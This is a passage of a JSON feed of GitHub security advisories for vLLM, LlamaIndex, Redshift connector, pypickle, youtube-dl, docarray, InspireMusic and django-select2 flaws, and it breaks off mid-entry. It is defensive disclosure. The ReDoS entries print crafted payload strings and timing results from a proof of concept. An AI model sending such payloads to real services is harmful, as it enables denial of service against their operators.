            "url": "https://github.com/advisories/GHSA-4qjh-9fv9-r85r",
            "title": "[vllm] Potential Timing Side-Channel Vulnerability in vLLM’s Chunk-Based Prefix Caching",
            "date_modified": "2025-05-29T21:27:57.000Z",
            "date_published": "2025-05-28T18:02:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4qjh-9fv9-r85r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A recent review identified several regular expressions in the vllm codebase that are susceptible to Regular Expression Denial of Service (ReDoS) attacks. These patterns, if fed with crafted or malicious input, may cause severe performance degradation due to catastrophic backtracking.</p>\n<h4 id=\"1-vllmlorautilspy-line-173\">1. vllm/lora/utils.py <a href=\"https://github.com/vllm-project/vllm/blob/2858830c39da0ae153bc1328dbba7680f5fbebe1/vllm/lora/utils.py#L173\">Line 173</a></h4>\n<p><a href=\"https://github.com/vllm-project/vllm/blob/2858830c39da0ae153bc1328dbba7680f5fbebe1/vllm/lora/utils.py#L173\">https://github.com/vllm-project/vllm/blob/2858830c39da0ae153bc1328dbba7680f5fbebe1/vllm/lora/utils.py#L173</a>\n<strong>Risk Description:</strong></p>\n<ul>\n<li>The regex <code>r\"\\((.*?)\\)\\$?$\"</code> matches content inside parentheses. If input such as <code>((((a|)+)+)+)</code> is passed in, it can cause catastrophic backtracking, leading to a ReDoS vulnerability.</li>\n<li>Using <code>.*?</code> (non-greedy match) inside group parentheses can be highly sensitive to input length and nesting complexity.</li>\n</ul>\n<p><strong>Remediation Suggestions:</strong></p>\n<ul>\n<li>Limit the input string length.</li>\n<li>Use a non-recursive matching approach, or write a regex with stricter content constraints.</li>\n<li>Consider using possessive quantifiers or atomic groups (not supported in Python yet), or split and process before regex matching.</li>\n</ul>\n<hr>\n<h4 id=\"2-vllmentrypointsopenaitool_parsersphi4mini_tool_parserpy-line-52\">2. vllm/entrypoints/openai/tool_parsers/phi4mini_tool_parser.py <a href=\"https://github.com/vllm-project/vllm/blob/2858830c39da0ae153bc1328dbba7680f5fbebe1/vllm/entrypoints/openai/tool_parsers/phi4mini_tool_parser.py#L52\">Line 52</a></h4>\n<p><a href=\"https://github.com/vllm-project/vllm/blob/2858830c39da0ae153bc1328dbba7680f5fbebe1/vllm/entrypoints/openai/tool_parsers/phi4mini_tool_parser.py#L52\">https://github.com/vllm-project/vllm/blob/2858830c39da0ae153bc1328dbba7680f5fbebe1/vllm/entrypoints/openai/tool_parsers/phi4mini_tool_parser.py#L52</a></p>\n<p><strong>Risk Description:</strong></p>\n<ul>\n<li>The regex <code>r'functools\\[(.*?)\\]'</code> uses <code>.*?</code> to match content inside brackets, together with <code>re.DOTALL</code>. If the input contains a large number of nested or crafted brackets, it can cause backtracking and ReDoS.</li>\n</ul>\n<p><strong>Remediation Suggestions:</strong></p>\n<ul>\n<li>Limit the length of <code>model_output</code>.</li>\n<li>Use a stricter, non-greedy pattern (avoid matching across extraneous nesting).</li>\n<li>Prefer <code>re.finditer()</code> and enforce a length constraint on each match.</li>\n</ul>\n<hr>\n<h4 id=\"3-vllmentrypointsopenaiserving_chatpy-line-351\">3. vllm/entrypoints/openai/serving_chat.py <a href=\"https://github.com/vllm-project/vllm/blob/2858830c39da0ae153bc1328dbba7680f5fbebe1/vllm/entrypoints/openai/serving_chat.py#L351\">Line 351</a></h4>\n<p><a href=\"https://github.com/vllm-project/vllm/blob/2858830c39da0ae153bc1328dbba7680f5fbebe1/vllm/entrypoints/openai/serving_chat.py#L351\">https://github.com/vllm-project/vllm/blob/2858830c39da0ae153bc1328dbba7680f5fbebe1/vllm/entrypoints/openai/serving_chat.py#L351</a></p>\n<p><strong>Risk Description:</strong></p>\n<ul>\n<li>The regex <code>r'.*\"parameters\":\\s*(.*)'</code> can trigger backtracking if <code>current_text</code> is very long and contains repeated structures.</li>\n<li>Especially when processing strings from unknown sources, <code>.*</code> matching any content is high risk.</li>\n</ul>\n<p><strong>Remediation Suggestions:</strong></p>\n<ul>\n<li>Use a more specific pattern (e.g., via JSON parsing).</li>\n<li>Impose limits on <code>current_text</code> length.</li>\n<li>Avoid using <code>.*</code> to capture large blocks of text; prefer structured parsing when possible.</li>\n</ul>\n<hr>\n<h4 id=\"4-benchmarksbenchmark_serving_structured_outputpy-line-650\">4. benchmarks/benchmark_serving_structured_output.py <a href=\"https://github.com/vllm-project/vllm/blob/2858830c39da0ae153bc1328dbba7680f5fbebe1/benchmarks/benchmark_serving_structured_output.py#L650\">Line 650</a></h4>\n<p><a href=\"https://github.com/vllm-project/vllm/blob/2858830c39da0ae153bc1328dbba7680f5fbebe1/benchmarks/benchmark_serving_structured_output.py#L650\">https://github.com/vllm-project/vllm/blob/2858830c39da0ae153bc1328dbba7680f5fbebe1/benchmarks/benchmark_serving_structured_output.py#L650</a></p>\n<p><strong>Risk Description:</strong></p>\n<ul>\n<li>The regex <code>r'\\{.*\\}'</code> is used to extract JSON inside curly braces. If the <code>actual</code> string is very long with unbalanced braces, it can cause backtracking, leading to a ReDoS vulnerability.</li>\n<li>Although this is used for benchmark correctness checking, it should still handle abnormal inputs carefully.</li>\n</ul>\n<p><strong>Remediation Suggestions:</strong></p>\n<ul>\n<li>Limit the length of <code>actual</code>.</li>\n<li>Prefer stepwise search for <code>{</code> and <code>}</code> or use a robust JSON extraction tool.</li>\n<li>Recommend first locating the range with simple string search, then applying regex.</li>\n</ul>\n<h3 id=\"fix\">Fix</h3>\n<ul>\n<li><a href=\"https://github.com/vllm-project/vllm/pull/18454\">https://github.com/vllm-project/vllm/pull/18454</a></li>\n</ul>\n<hr>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vllm-project/vllm/security/advisories/GHSA-j828-28rj-hfhp\">https://github.com/vllm-project/vllm/security/advisories/GHSA-j828-28rj-hfhp</a></li>\n<li><a href=\"https://github.com/vllm-project/vllm/pull/18454\">https://github.com/vllm-project/vllm/pull/18454</a></li>\n<li><a href=\"https://github.com/vllm-project/vllm/commit/4fc1bf813ad80172c1db31264beaef7d93fe0601\">https://github.com/vllm-project/vllm/commit/4fc1bf813ad80172c1db31264beaef7d93fe0601</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j828-28rj-hfhp\">https://github.com/advisories/GHSA-j828-28rj-hfhp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j828-28rj-hfhp",
            "title": "[vllm] vLLM vulnerable to Regular Expression Denial of Service",
            "date_modified": "2025-05-28T19:57:53.000Z",
            "date_published": "2025-05-28T17:50:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j828-28rj-hfhp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>A Regular Expression Denial of Service (ReDoS) vulnerability exists in the file <a href=\"https://github.com/vllm-project/vllm/blob/main/vllm/entrypoints/openai/tool_parsers/pythonic_tool_parser.py\"><code>vllm/entrypoints/openai/tool_parsers/pythonic_tool_parser.py</code></a> of the vLLM project. The root cause is the use of a highly complex and nested regular expression for tool call detection, which can be exploited by an attacker to cause severe performance degradation or make the service unavailable.</p>\n<h2 id=\"details\">Details</h2>\n<p>The following regular expression is used to match tool/function call patterns:</p>\n<pre><code>r\"\\[([a-zA-Z]+\\w*\\(([a-zA-Z]+\\w*=.*,\\s*)*([a-zA-Z]+\\w*=.*\\s)?\\),\\s*)*([a-zA-Z]+\\w*\\(([a-zA-Z]+\\w*=.*,\\s*)*([a-zA-Z]+\\w*=.*\\s*)?\\)\\s*)+\\]\"\n</code></pre>\n<p>This pattern contains multiple nested quantifiers (<code>*</code>, <code>+</code>), optional groups, and inner repetitions which make it vulnerable to catastrophic backtracking.</p>\n<p><strong>Attack Example:</strong>\nA malicious input such as  </p>\n<pre><code>[A(A=\t)A(A=,\t\t)A(A=,\t\t)A(A=,\t\t)... (repeated dozens of times) ...]\n\nor\n\n\"[A(A=\" + \"\\t)A(A=,\\t\" * repeat\n</code></pre>\n<p>can cause the regular expression engine to consume CPU exponentially with the input length, effectively freezing or crashing the server (DoS).</p>\n<p><strong>Proof of Concept:</strong>\nA Python script demonstrates that matching such a crafted string with the above regex results in exponential time complexity. Even moderate input lengths can bring the system to a halt.</p>\n<pre><code>Length: 22, Time: 0.0000 seconds, Match: False\nLength: 38, Time: 0.0010 seconds, Match: False\nLength: 54, Time: 0.0250 seconds, Match: False\nLength: 70, Time: 0.5185 seconds, Match: False\nLength: 86, Time: 13.2703 seconds, Match: False\nLength: 102, Time: 319.0717 seconds, Match: False\n</code></pre>\n<h2 id=\"impact\">Impact</h2>\n<ul>\n<li><strong>Denial of Service (DoS):</strong> An attacker can trigger a denial of service by sending specially crafted payloads to any API or interface that invokes this regex, causing excessive CPU usage and making the vLLM service unavailable.</li>\n<li><strong>Resource Exhaustion and Memory Retention:</strong> As this regex is invoked during function call parsing, the matching process may hold on to significant CPU and memory resources for extended periods (due to catastrophic backtracking). In the context of vLLM, this also means that the associated KV cache (used for model inference and typically stored in GPU memory) is not released in a timely manner. This can lead to GPU memory exhaustion, degraded throughput, and service instability.</li>\n<li><strong>Potential for Broader System Instability:</strong> Resource exhaustion from stuck or slow requests may cascade into broader system instability or service downtime if not mitigated.</li>\n</ul>\n<h2 id=\"fix\">Fix</h2>\n<ul>\n<li><a href=\"https://github.com/vllm-project/vllm/pull/18454\">https://github.com/vllm-project/vllm/pull/18454</a></li>\n<li>Note that while this change has significantly improved performance, this regex may still be problematic. It has gone from exponential time complexity, O(2^N), to O(N^2).</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vllm-project/vllm/security/advisories/GHSA-w6q7-j642-7c25\">https://github.com/vllm-project/vllm/security/advisories/GHSA-w6q7-j642-7c25</a></li>\n<li><a href=\"https://github.com/vllm-project/vllm/pull/18454\">https://github.com/vllm-project/vllm/pull/18454</a></li>\n<li><a href=\"https://github.com/vllm-project/vllm/commit/4fc1bf813ad80172c1db31264beaef7d93fe0601\">https://github.com/vllm-project/vllm/commit/4fc1bf813ad80172c1db31264beaef7d93fe0601</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w6q7-j642-7c25\">https://github.com/advisories/GHSA-w6q7-j642-7c25</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w6q7-j642-7c25",
            "title": "[vllm] vLLM has a Regular Expression Denial of Service (ReDoS, Exponential Complexity) Vulnerability in `pythonic_tool_parser.py`",
            "date_modified": "2025-05-29T21:07:39.000Z",
            "date_published": "2025-05-28T17:49:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w6q7-j642-7c25"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A SQL injection vulnerability exists in the <code>duckdb_retriever</code> component of the run-llama/llama_index repository, specifically in llama-index-retrievers-duckdb-retriever prior to v0.4.0. The vulnerability arises from the construction of SQL queries without using prepared statements, allowing an attacker to inject arbitrary SQL code. This can lead to remote code execution (RCE) by installing the shellfs extension and executing malicious commands.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-11958\">https://nvd.nist.gov/vuln/detail/CVE-2024-11958</a></li>\n<li><a href=\"https://github.com/run-llama/llama_index/commit/35bd221e948e40458052d30c6ef2779bc965b6d0\">https://github.com/run-llama/llama_index/commit/35bd221e948e40458052d30c6ef2779bc965b6d0</a></li>\n<li><a href=\"https://huntr.com/bounties/8ddf66e1-f74c-4d53-992b-76bc45cacac1\">https://huntr.com/bounties/8ddf66e1-f74c-4d53-992b-76bc45cacac1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-339r-cjv9-x78g\">https://github.com/advisories/GHSA-339r-cjv9-x78g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-339r-cjv9-x78g",
            "title": "[llama-index-retrievers-duckdb-retriever]  LlamaIndex Retrievers Integration: DuckDBRetriever SQL Injection",
            "date_modified": "2025-05-28T16:09:37.000Z",
            "date_published": "2025-03-20T12:32:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-339r-cjv9-x78g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>LLama-Index CLI prior to v0.4.1, corresponding to LLama-Index prior to v0.12.21, contains an OS command injection vulnerability. The vulnerability arises from the improper handling of the <code>--files</code> argument, which is directly passed into <code>os.system</code>. An attacker who controls the content of this argument can inject and execute arbitrary shell commands. This vulnerability can be exploited locally if the attacker has control over the CLI arguments, and remotely if a web application calls the LLama-Index CLI with a user-controlled filename. This issue can lead to arbitrary code execution on the affected system.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1753\">https://nvd.nist.gov/vuln/detail/CVE-2025-1753</a></li>\n<li><a href=\"https://github.com/run-llama/llama_index/commit/b57e76738c53ca82d88658b82f2d82d1c7839c7d\">https://github.com/run-llama/llama_index/commit/b57e76738c53ca82d88658b82f2d82d1c7839c7d</a></li>\n<li><a href=\"https://huntr.com/bounties/19e1c67e-1d77-451d-b10b-acbe99900b22\">https://huntr.com/bounties/19e1c67e-1d77-451d-b10b-acbe99900b22</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g99h-56mw-8263\">https://github.com/advisories/GHSA-g99h-56mw-8263</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g99h-56mw-8263",
            "title": "[llama-index-cli] LLama-Index CLI OS command injection vulnerability",
            "date_modified": "2025-05-28T16:07:50.000Z",
            "date_published": "2025-05-28T12:30:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g99h-56mw-8263"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p><a href=\"https://docs.aws.amazon.com/redshift/latest/mgmt/python-redshift-driver.html\">Amazon Redshift Python Connector</a> is a pure Python connector to Redshift (i.e., driver) that implements the <a href=\"https://www.python.org/dev/peps/pep-0249/\">Python Database API Specification 2.0</a>.</p>\n<p>When the Amazon Redshift Python Connector is configured with the BrowserAzureOAuth2CredentialsProvider plugin, the driver skips the SSL certificate validation step for the Identity Provider. </p>\n<h3 id=\"impact\">Impact</h3>\n<p>An insecure connection could allow an actor to intercept the token exchange process and retrieve an access token.</p>\n<p><strong>Impacted versions:</strong> &gt;=2.0.872;&lt;=2.1.6</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade Amazon Redshift Python Connector to version 2.1.7 and ensure any forked or derivative code is patched to incorporate the new fixes.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>None</p>\n<h3 id=\"references\">References</h3>\n<p>If you have any questions or comments about this advisory we ask that you contact AWS/Amazon Security via our vulnerability reporting page [1] or directly via email to <a href=\"mailto:aws-security@amazon.com\">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>\n<p>[1] Vulnerability reporting page: <a href=\"https://aws.amazon.com/security/vulnerability-reporting\">https://aws.amazon.com/security/vulnerability-reporting</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/aws/amazon-redshift-python-driver/security/advisories/GHSA-r244-wg5g-6w2r\">https://github.com/aws/amazon-redshift-python-driver/security/advisories/GHSA-r244-wg5g-6w2r</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-5279\">https://nvd.nist.gov/vuln/detail/CVE-2025-5279</a></li>\n<li><a href=\"https://aws.amazon.com/security/security-bulletins\">https://aws.amazon.com/security/security-bulletins</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r244-wg5g-6w2r\">https://github.com/advisories/GHSA-r244-wg5g-6w2r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r244-wg5g-6w2r",
            "title": "[redshift-connector] Issue with Amazon Redshift Python Connector and the BrowserAzureOAuth2CredentialsProvider plugin",
            "date_modified": "2025-05-28T14:57:31.000Z",
            "date_published": "2025-05-28T14:57:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r244-wg5g-6w2r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability was found in erdogant pypickle up to 1.1.5 and classified as problematic. Affected by this issue is the function load of the file pypickle/pypickle.py. The manipulation leads to deserialization. Local access is required to approach this attack. The exploit has been disclosed to the public and may be used. Upgrading to version 2.0.0 is able to address this issue. The patch is identified as 14b4cae704a0bb4eb6723e238f25382d847a1917. It is recommended to upgrade the affected component.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-5174\">https://nvd.nist.gov/vuln/detail/CVE-2025-5174</a></li>\n<li><a href=\"https://github.com/erdogant/pypickle/issues/2\">https://github.com/erdogant/pypickle/issues/2</a></li>\n<li><a href=\"https://github.com/erdogant/pypickle/issues/2#issuecomment-2889146579\">https://github.com/erdogant/pypickle/issues/2#issuecomment-2889146579</a></li>\n<li><a href=\"https://github.com/erdogant/pypickle/commit/14b4cae704a0bb4eb6723e238f25382d847a1917\">https://github.com/erdogant/pypickle/commit/14b4cae704a0bb4eb6723e238f25382d847a1917</a></li>\n<li><a href=\"https://github.com/erdogant/pypickle/releases/tag/2.0.0\">https://github.com/erdogant/pypickle/releases/tag/2.0.0</a></li>\n<li><a href=\"https://vuldb.com/?ctiid.310262\">https://vuldb.com/?ctiid.310262</a></li>\n<li><a href=\"https://vuldb.com/?id.310262\">https://vuldb.com/?id.310262</a></li>\n<li><a href=\"https://vuldb.com/?submit.579157\">https://vuldb.com/?submit.579157</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5qwj-342r-h886\">https://github.com/advisories/GHSA-5qwj-342r-h886</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5qwj-342r-h886",
            "title": "[pypickle] pypickle unsafe deserialization vulnerability",
            "date_modified": "2025-05-27T22:36:44.000Z",
            "date_published": "2025-05-26T09:30:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5qwj-342r-h886"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h4 id=\"description\">Description</h4>\n<p>This advisory follows the security advisory <a href=\"https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j\">GHSA-79w7-vh3h-8g4j published by the <em>yt-dlp/yt-dlp</em> project</a> to aid remediation of the issue in the <em>ytdl-org/youtube-dl</em> project.</p>\n<h3 id=\"vulnerability\">Vulnerability</h3>\n<p><em>youtube-dl</em> does not limit the extensions of downloaded files, which could lead to arbitrary filenames being created in the download folder (and path traversal on Windows). </p>\n<h3 id=\"impact\">Impact</h3>\n<p>Since <em>youtube-dl</em> also reads config from the working directory (and, on Windows, executables will be executed from the <em>youtube-dl</em> directory by default) the vulnerability could allow the unwanted execution of local code, including downloads masquerading as, eg, subtitles.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The versions of <em>youtube-dl</em> listed as <em>Patched</em> remediate this vulnerability by disallowing path separators and whitelisting allowed extensions. As a result, some very uncommon extensions might not get downloaded.</p>\n<p><strong>Master code d42a222 or later and nightly builds tagged 2024-07-03 or later</strong> contain the remediation.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Any/all of the below considerations may limit exposure in case it is necessary to use a vulnerable version</p>\n<ul>\n<li>have <code>.%(ext)s</code> at the end of the output template</li>\n<li>download from websites that you trust</li>\n<li>do not download to a directory within the executable search <code>PATH</code> or other sensitive locations, such as your user directory or system directories</li>\n<li>in Windows versions that support it, set <a href=\"https://stackoverflow.com/a/50118548\"><code>NoDefaultCurrentDirectoryInExePath</code></a> to prevent the <em>cmd</em> shell's executable search adding the default directory before <code>PATH</code></li>\n<li>consider that the path traversal vulnerability as a result of resolving <code>non_existent_dir\\..\\..\\target</code> does not exist in Linux or macOS</li>\n<li>ensure the extension of the media to download is a common video/audio/... one (use <code>--get-filename</code>)</li>\n<li>omit any of the subtitle options (<code>--write-subs</code>/<code> --write-srt</code>, <code>--write-auto-subs</code>/<code>--write-automatic-subs</code>, <code>--all-subs</code>).</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j\">GHSA-79w7-vh3h-8g4j</a></li>\n<li><a href=\"https://github.com/ytdl-org/youtube-dl/pull/32830\">https://github.com/ytdl-org/youtube-dl/pull/32830</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/dirkf/youtube-dl/security/advisories/GHSA-22fp-mf44-f2mq\">https://github.com/dirkf/youtube-dl/security/advisories/GHSA-22fp-mf44-f2mq</a></li>\n<li><a href=\"https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j\">https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-38519\">https://nvd.nist.gov/vuln/detail/CVE-2024-38519</a></li>\n<li><a href=\"https://github.com/ytdl-org/youtube-dl/pull/32830\">https://github.com/ytdl-org/youtube-dl/pull/32830</a></li>\n<li><a href=\"https://github.com/ytdl-org/youtube-dl/commit/d42a222ed541b96649396ef00e19552aef0f09ec\">https://github.com/ytdl-org/youtube-dl/commit/d42a222ed541b96649396ef00e19552aef0f09ec</a></li>\n<li><a href=\"https://securitylab.github.com/advisories/GHSL-2024-089_youtube-dl\">https://securitylab.github.com/advisories/GHSL-2024-089_youtube-dl</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-22fp-mf44-f2mq\">https://github.com/advisories/GHSA-22fp-mf44-f2mq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-22fp-mf44-f2mq",
            "title": "[youtube-dl] youtube-dl vulnerable to file system modification and RCE through improper file-extension sanitization",
            "date_modified": "2025-05-28T16:48:20.000Z",
            "date_published": "2025-04-18T20:24:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-22fp-mf44-f2mq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability was found in docarray up to 0.40.1. It has been rated as critical. Affected by this issue is the function <strong>getitem</strong> of the file /docarray/data/torch_dataset.py of the component Web API. The manipulation leads to improperly controlled modification of object prototype attributes ('prototype pollution'). The attack may be launched remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-5150\">https://nvd.nist.gov/vuln/detail/CVE-2025-5150</a></li>\n<li><a href=\"https://gist.github.com/superboy-zjc/56502343bcb12eb653081b426debf2c8\">https://gist.github.com/superboy-zjc/56502343bcb12eb653081b426debf2c8</a></li>\n<li><a href=\"https://vuldb.com/?ctiid.310238\">https://vuldb.com/?ctiid.310238</a></li>\n<li><a href=\"https://vuldb.com/?id.310238\">https://vuldb.com/?id.310238</a></li>\n<li><a href=\"https://vuldb.com/?submit.574696\">https://vuldb.com/?submit.574696</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j9wp-865g-rf48\">https://github.com/advisories/GHSA-j9wp-865g-rf48</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j9wp-865g-rf48",
            "title": "[docarray] docarray prototype pollution",
            "date_modified": "2025-05-27T19:54:35.000Z",
            "date_published": "2025-05-25T15:30:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j9wp-865g-rf48"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability was found in erdogant pypickle up to 1.1.5. It has been classified as critical. This affects the function Save of the file pypickle/pypickle.py. The manipulation leads to improper authorization. Attacking locally is a requirement. The exploit has been disclosed to the public and may be used. Upgrading to version 2.0.0 is able to address this issue. The patch is named 14b4cae704a0bb4eb6723e238f25382d847a1917. It is recommended to upgrade the affected component.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-5175\">https://nvd.nist.gov/vuln/detail/CVE-2025-5175</a></li>\n<li><a href=\"https://github.com/erdogant/pypickle/issues/3\">https://github.com/erdogant/pypickle/issues/3</a></li>\n<li><a href=\"https://github.com/erdogant/pypickle/issues/3#issue-3070689116\">https://github.com/erdogant/pypickle/issues/3#issue-3070689116</a></li>\n<li><a href=\"https://github.com/erdogant/pypickle/issues/3#issuecomment-2888589652\">https://github.com/erdogant/pypickle/issues/3#issuecomment-2888589652</a></li>\n<li><a href=\"https://github.com/erdogant/pypickle/commit/14b4cae704a0bb4eb6723e238f25382d847a1917\">https://github.com/erdogant/pypickle/commit/14b4cae704a0bb4eb6723e238f25382d847a1917</a></li>\n<li><a href=\"https://github.com/erdogant/pypickle/releases/tag/2.0.0\">https://github.com/erdogant/pypickle/releases/tag/2.0.0</a></li>\n<li><a href=\"https://vuldb.com/?ctiid.310263\">https://vuldb.com/?ctiid.310263</a></li>\n<li><a href=\"https://vuldb.com/?id.310263\">https://vuldb.com/?id.310263</a></li>\n<li><a href=\"https://vuldb.com/?submit.579824\">https://vuldb.com/?submit.579824</a></li>\n<li><a href=\"https://github.com/PrinceRaj-0/Vulnerability-Disclosure/blob/main/CVE-2025-5175.md\">https://github.com/PrinceRaj-0/Vulnerability-Disclosure/blob/main/CVE-2025-5175.md</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qpxx-2cwh-r5vh\">https://github.com/advisories/GHSA-qpxx-2cwh-r5vh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qpxx-2cwh-r5vh",
            "title": "[pypickle] pypickle Incorrect Privilege Assignment vulnerability",
            "date_modified": "2025-05-27T19:54:24.000Z",
            "date_published": "2025-05-26T09:30:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qpxx-2cwh-r5vh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability was found in FunAudioLLM InspireMusic up to bf32364bcb0d136497ca69f9db622e9216b029dd. It has been classified as critical. Affected is the function load_state_dict of the file inspiremusic/cli/model.py of the component Pickle Data Handler. The manipulation leads to deserialization. An attack has to be approached locally. This product is using a rolling release to provide continious delivery. Therefore, no version details for affected nor updated releases are available. The name of the patch is 784cbf8dde2cf1456ff808aeba23177e1810e7a9. It is recommended to apply a patch to fix this issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-5148\">https://nvd.nist.gov/vuln/detail/CVE-2025-5148</a></li>\n<li><a href=\"https://github.com/FunAudioLLM/InspireMusic/issues/53\">https://github.com/FunAudioLLM/InspireMusic/issues/53</a></li>\n<li><a href=\"https://github.com/FunAudioLLM/InspireMusic/issues/53#issuecomment-2866688220\">https://github.com/FunAudioLLM/InspireMusic/issues/53#issuecomment-2866688220</a></li>\n<li><a href=\"https://github.com/FunAudioLLM/InspireMusic/commit/784cbf8dde2cf1456ff808aeba23177e1810e7a9\">https://github.com/FunAudioLLM/InspireMusic/commit/784cbf8dde2cf1456ff808aeba23177e1810e7a9</a></li>\n<li><a href=\"https://vuldb.com/?ctiid.310236\">https://vuldb.com/?ctiid.310236</a></li>\n<li><a href=\"https://vuldb.com/?id.310236\">https://vuldb.com/?id.310236</a></li>\n<li><a href=\"https://vuldb.com/?submit.573800\">https://vuldb.com/?submit.573800</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pgp9-g5q8-j3wp\">https://github.com/advisories/GHSA-pgp9-g5q8-j3wp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pgp9-g5q8-j3wp",
            "title": "[inspiremusic] FunAudioLLM InspireMusic deserialization vulnerability",
            "date_modified": "2025-05-27T19:48:30.000Z",
            "date_published": "2025-05-25T12:30:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pgp9-g5q8-j3wp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Instances of <code>HeavySelect2Mixin</code> subclasses like the <code>ModelSelect2MultipleWidget</code> and <code>ModelSelect2Widget</code> can secret access tokens across requests. This can allow users to access restricted querysets and restricted data.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The problem has been patched in version 8.4.1 and all following versions.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>This vulnerability is limited use cases where instances of widget classes are created during app loading (not during a request).</p>\n<p>Example of affected code:</p>\n<pre><code class=\"language-python\">class MyForm(forms.ModelForm):\n    class Meta:\n        widgets = {\"my_select_field\": Select2ModelWidget()}\n</code></pre>\n<p>Django allows you to pass just the widget class (not the instance). This can be used to mitigate the session request leak.</p>\n<p>Example of affected code:</p>\n<pre><code class=\"language-python\">class MyForm(forms.ModelForm):\n    class Meta:\n        widgets = {\"my_select_field\": Select2ModelWidget}\n</code></pre>\n<h3 id=\"references\">References</h3>\n<p>Thanks to @neartik for reporting this issue. I will address it later. I had to delete your issue, to avoid exploitation of this security issue.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/codingjoe/django-select2/security/advisories/GHSA-wjrh-hj83-3wh7\">https://github.com/codingjoe/django-select2/security/advisories/GHSA-wjrh-hj83-3wh7</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-48383\">https://nvd.nist.gov/vuln/detail/CVE-2025-48383</a></li>\n<li><a 